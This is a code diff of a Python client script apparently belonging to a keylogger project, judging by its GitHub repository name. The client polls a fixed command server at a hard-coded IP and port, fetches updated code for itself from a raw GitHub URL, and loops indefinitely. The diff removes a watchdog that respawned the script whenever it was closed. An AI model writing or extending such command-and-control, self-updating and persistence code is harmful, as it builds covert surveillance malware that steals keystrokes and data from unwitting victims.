@@ -5,7 +5,7 @@ import os
 import sys
 
 # Constants
-SERVER_URL = 'http://192.168.15.16:6969'  # Use your server's IP and port
+SERVER_URL = 'http://192.168.15.16:6969'  # Server IP and changed port to 6969
 GITHUB_URL = 'https://raw.githubusercontent.com/JJcoded/keylogger-repo/refs/heads/main/client.py'
 LOCAL_PATH = os.path.abspath(__file__)
 
@@ -40,22 +40,8 @@ def communicate_with_server():
     except (requests.ConnectionError, requests.Timeout):
         print("[Client] Server not available. Reconnecting...")
 
-def restart_script():
-    """ Restart the script if closed """
-    while True:
-        # Start a subprocess that runs this same script
-        print("[Monitor] Starting the client script again...")
-        process = subprocess.Popen([sys.executable] + sys.argv)
-
-        # Monitor the process and wait for it to close
-        process.wait()
-
-        # If the script closes, restart after 5 seconds
-        print("[Monitor] Client script closed. Restarting in 5 seconds...")
-        time.sleep(5)
-
-def client_main():
-    """ The main client logic goes here """
+if __name__ == "__main__":
+    # Continuous loop for checking server and updating
     while True:
         # Check for updates on GitHub
         check_for_updates()
@@ -65,17 +51,3 @@ def client_main():
         
         # Sleep to avoid spamming requests
         time.sleep(10)
-
-if __name__ == "__main__":
-    # Check if this is the parent or the child process
-    if len(sys.argv) > 1 and sys.argv[1] == "child":
-        client_main()
-    else:
-        print("[Monitor] Starting the monitor...")
-        # Start the child process that runs the main client logic
-        while True:
-            # Fork the process to run the client logic
-            subprocess.Popen([sys.executable, __file__, "child"])
-
-            # Monitor the child process and restart if it closes
-            restart_script()
